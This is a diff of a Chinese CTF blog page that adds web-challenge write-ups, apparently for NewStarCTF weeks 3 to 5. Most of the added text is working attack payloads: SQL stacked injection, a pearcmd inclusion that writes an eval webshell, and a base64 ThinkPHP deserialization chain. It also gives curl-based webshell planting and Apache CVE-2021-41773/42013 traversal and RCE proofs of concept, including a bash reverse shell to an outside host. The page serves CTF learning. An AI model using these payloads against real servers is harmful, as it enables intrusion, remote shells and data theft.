@@ -480,21 +480,21 @@ include(&amp;quot;seed.php&amp;quot;);
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-09-27
+                    2022-10-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    11 分
                 </div>
                 
 
@@ -652,6 +652,88 @@ if (isset($id)) &#123;
 <p>找到flag在的地方，然后查询</p>
 <p><code>&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\nffffllllaaagggg_1n_h3r3_flag &#123;\nflag\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;</code></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20220927142726823.png" alt="image-20220927142726823"></p>
+<h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="BabySSTI-One"><a href="#BabySSTI-One" class="headerlink" title="BabySSTI_One"></a>BabySSTI_One</h3><p>直接用之前珍藏的那个ssti payload往里写马</p>
+<h3 id="multiSQL"><a href="#multiSQL" class="headerlink" title="multiSQL"></a>multiSQL</h3><p>1&#39;;show tables;#</p>
+<p>1&#39;;show columns from score;#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003220711088.png" alt="image-20221003220711088"></p>
+<p>改成绩</p>
+<p>1&#39;;SET @sqli=concat(char(117,112,100,97,116,101),&#39; <code>score</code> SET  listen= 221&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</p>
+<p>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from score&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003222246387.png" alt="image-20221003222246387"></p>
+<p>验证</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221003222306150.png" alt="image-20221003222306150"></p>
+<h3 id="IncludeTwo"><a href="#IncludeTwo" class="headerlink" title="IncludeTwo"></a>IncludeTwo</h3><p>pear文件包含rce</p>
+<pre class="language-none"><code class="language-none">?file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;+config-create+&#x2F;&lt;?&#x3D;eval($_POST[a]);?&gt;+&#x2F;tmp&#x2F;hello.php</code></pre>
+
+<p>然后包含hello.php</p>
+<p>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ</p>
+<h3 id="Maybe-You-Have-To-think-More"><a href="#Maybe-You-Have-To-think-More" class="headerlink" title="Maybe You Have To think More"></a>Maybe You Have To think More</h3><p>好怪的题目，不给源码的反序列化可还行</p>
+<p>cookie里是序列化的内容，然后通过报错可以得到是tp5.1.41的版本。直接去网上找现成的反序列化链子。</p>
+<p>正好有个对应版本的反序列化链，但是不知道为啥拿到的payload没法用，可能是源码不太一样</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/269882.html">https://www.freebuf.com/vuls/269882.html</a></p>
+<p>这里我们用这个</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54902210/article/details/124874209">ThinkPHP5.1反序列化漏洞_Sentiment.的博客-CSDN博客_thinkphp5.1漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263977.html">https://www.freebuf.com/vuls/263977.html</a></p>
+<p>与文章里唯一的不同就是要把序列化的内容放了cookie里。</p>
+<p>然后在环境变量里可以找到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221004150141562.png" alt="image-20221004150141562"></p>
+<h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="So Baby RCE"></a>So Baby RCE</h3><p>两种方法：</p>
+<p>一种是用&amp;&amp;来连接命令，使用cd来穿越目录，然后用sort来读取</p>
+<p>cmd=cd%09..%26%26cd%09..%26%26cd%09..%26%26sort%09ffff?lllaaaaggggg </p>
+<p>另一种是curl种马</p>
+<p>cmd=curl%09-o%091.php%09ip</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020143124846.png" alt="image-20221020143124846"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020143202810.png" alt="image-20221020143202810"></p>
+<h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h3><pre class="language-none"><code class="language-none">CVE-2021-41773</code></pre>
+
+<p>影响版本：<code>Apache 2.4.49</code></p>
+<p>poc:</p>
+<pre class="language-none"><code class="language-none">curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;%2e%2e&#x2F;etc&#x2F;passwd
+
+curl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&#39;
+
+curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.190.146&#x2F;8888 0&gt;&amp;1&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;.%2e&#x2F;bin&#x2F;sh&quot;
+url perl复制代码
+CVE-2021-42013</code></pre>
+
+<p>影响版本：<code>Apache 2.4.49 和 Apache 2.4.50</code></p>
+<p>poc:</p>
+<pre class="language-none"><code class="language-none">curl -v --path-as-is http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;icons&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;etc&#x2F;passwd
+
+curl -v --data &quot;echo;id&quot; &#39;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&#39;
+
+curl -s --path-as-is -d &#39;echo Content-Type: text&#x2F;plain; echo; whoami&#39; &quot;http:&#x2F;&#x2F;192.168.190.134:8080&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh&quot;</code></pre>
+
+<p>从响应可以看到是apache2.4.50版本</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020132536774.png" alt="image-20221020132536774"></p>
+<p>如果服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令</p>
+<p>直接构造payload进行rce</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020132755497.png" alt="image-20221020132755497"></p>
+<h3 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&quot;cmd&quot;]))&#123;
+    if(preg_match(&#39;&#x2F;bash|curl&#x2F;i&#39;,$_GET[&quot;cmd&quot;]))&#123;
+        echo &quot;Hacker!&quot;;
+    &#125;else&#123;
+        shell_exec($_GET[&quot;cmd&quot;]);
+    &#125;
+&#125;else&#123;
+    show_source(__FILE__);
+&#125;</code></pre>
+
+<p>可以直接写文件，记得转义$号</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">?cmd&#x3D;echo &quot;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&quot; &gt; 1.php</code></pre>
+
+<p>可以看到根目录下有flag文件，但是因为是700的权限，所以我们需要提权</p>
+<p>这里是利用的suid提权</p>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
+<p>不知道为什么在蚁剑的虚拟终端里没显示</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020140222567.png" alt="image-20221020140222567"></p>
+<p>看到有date，就可以利用date命令读取flag文件</p>
+<p>这里在网页不会有回显，可能是因为date是通过报错把文件读出来的，但是网页没有回显Linux里的报错。(猜的，没验证过</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20221020140729163.png" alt="image-20221020140729163"></p>
 
                 
             </div>
@@ -1153,18 +1235,17 @@ if (isset($id)) &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/09/25/NewStarCTF/">
+                <a href="/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/3.jpg" class="responsive-img" alt="NewStarCTF">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/16.jpg" class="responsive-img" alt="一些web题">
                         
-                        <span class="card-title">NewStarCTF</span>
+                        <span class="card-title">一些web题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1174,9 +1255,9 @@ if (isset($id)) &#123;
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-20
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1185,7 +1266,6 @@ if (isset($id)) &#123;
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -1415,7 +1495,7 @@ $(function () {
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2019-2023</span>
             
             <a href="/about" target="_blank">Ethe</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
@@ -1423,7 +1503,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">170.8k</span>
+                        class="white-color">173.3k</span>
             
             
             
